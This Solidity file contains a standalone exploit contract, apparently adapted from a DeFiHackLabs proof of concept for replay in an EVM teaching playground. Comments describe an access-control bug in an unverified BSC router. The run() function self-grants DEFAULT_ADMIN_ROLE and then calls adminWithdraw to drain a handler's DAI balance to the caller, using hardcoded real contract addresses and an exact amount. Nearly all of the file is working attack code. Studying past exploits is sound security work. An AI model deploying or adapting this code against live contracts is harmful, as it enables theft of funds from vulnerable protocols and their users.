// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-08-unverified_667d).
// The DeFiHackLabs PoC (test/unverified_667d_exp.sol) runs the WHOLE attack
// INLINE in the constructor of `AttackerC`, deployed via `new AttackerC()`
// from `testPoC()`. Because recordExploit.ts always deploys UNRECORDED and
// then records exactly one function call (a constructor itself can never be
// the recorded call), this is reproduced as a SYNTHETIC exploit with the
// constructor's two calls moved verbatim into a callable `run()` entrypoint.
//
// Root cause: the unverified "admin router" contract (0x8DE7...34E9) is an
// OpenZeppelin-AccessControl-style contract whose `grantRole(bytes32,address)`
// was deployed WITHOUT the standard `onlyRole(getRoleAdmin(role))` guard —
// anyone can call grantRole(0x00, self) and instantly hold
// DEFAULT_ADMIN_ROLE. `adminWithdraw(handler, token, recipient, amount)` IS
// correctly gated on that role, but since the role itself is
// self-grantable, the gate is meaningless: the newly self-granted "admin"
// immediately calls adminWithdraw to forward `handler.withdraw(...)`, which
// transfers the handler's entire DAI balance to the attacker.
//
// Both the router (0x8DE7...34E9) and the handler (0x667D...A6Dc) are
// UNVERIFIED on BscScan (no published source), so there is no verified
// source for the playground to fall back on — every editorial locator below
// anchors on "exploit" (UnverifiedAdminRoleDrain.run()), the only address
// the playground has a source map for. Logic, constants, and the call
// sequence are copied verbatim from test/unverified_667d_exp.sol's
// AttackerC constructor.

interface IVulnRouter {
    function grantRole(bytes32 role, address account) external;
    function adminWithdraw(address handler, address token, address recipient, uint256 amount) external;
}

contract UnverifiedAdminRoleDrain {
    address internal constant VUL_ADDR = 0x8DE7EAbA58EfB23B6F323984377af582B23134e9;
    address internal constant HANDLER_ADDR = 0x667DFEd3C4D56DF32Ecc3F2E3CE5BcC4ef03A6Dc;
    address internal constant DAI = 0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3;

    // Mirrors AttackerC's constructor body (lines 42-64 of
    // test/unverified_667d_exp.sol) verbatim, moved into a callable
    // entrypoint so the recorder can capture it as the single recorded call
    // after an unrecorded deploy.
    function run() external {
        // step 1 — the bug: grantRole has no admin gate, so anyone can
        // self-grant DEFAULT_ADMIN_ROLE (role id 0x00).
        (bool s1, ) = VUL_ADDR.call(
            abi.encodeWithSelector(bytes4(keccak256("grantRole(bytes32,address)")), bytes32(0), address(this))
        );
        require(s1, "grantRole failed");

        // step 2 — adminWithdraw's role check now trivially passes; the
        // router forwards a withdraw request to the handler, which
        // transfers its entire DAI balance to the attacker EOA.
        (bool s2, ) = VUL_ADDR.call(
            abi.encodeWithSelector(
                bytes4(keccak256("adminWithdraw(address,address,address,uint256)")),
                HANDLER_ADDR,
                DAI,
                msg.sender,
                uint256(10463638549999999999999)
            )
        );
        require(s2, "adminWithdraw failed");
    }
}
